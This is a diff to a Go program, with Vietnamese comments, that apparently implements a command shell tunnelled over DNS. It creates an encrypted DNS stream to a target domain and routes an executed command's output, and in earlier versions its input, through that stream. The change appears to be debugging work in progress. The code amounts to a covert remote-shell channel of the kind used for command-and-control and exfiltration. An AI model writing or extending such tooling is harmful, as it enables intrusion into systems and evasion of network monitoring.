@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"fmt"
 	"ipwf/lib/transport"
+	"os"
 	"os/exec"
 	"runtime"
 )
@@ -29,17 +30,18 @@ func main() {
 	// khởi tạo dnsTransport bằng dữ liệu đã gói của DNSStream
 	dnsTransport := transport.DNSStream(targetDomain, encryptionKey)
 
-	scanner := bufio.NewScanner(dnsTransport)
-	// scanner.Text() = dnsTransport
-	for scanner.Scan() {
-		fmt.Println(scanner.Text())
-	}
+	fmt.Println(dnsTransport)
+	// scanner := bufio.NewScanner(dnsTransport)
+	// // scanner.Text() = dnsTransport
+	// for scanner.Scan() {
+	// 	fmt.Println(scanner.Text())
+	// }
 
-	if scanner.Err() != nil {
-		// Handle error.
-		fmt.Println(scanner.Err())
+	// if scanner.Err() != nil {
+	// 	// Handle error.
+	// 	fmt.Println(scanner.Err())
 
-	}
+	// }
 
 	// // gán cho cmd.Stdout bằng dữ liệu của dnsTransport
 	cmd.Stdout = dnsTransport
@@ -49,7 +51,7 @@ func main() {
 
 	// // gán cho cmd.Stdin bằng dữ liệu của dnsTransport
 	// cmd.Stdin = dnsTransport
-	// cmd.Stdin = bufio.NewReader(os.Args)
+	cmd.Stdin = bufio.NewReader(os.Stdin)
 
 	// // hiển thị dnsTransport để kiểm xoát thêm
 
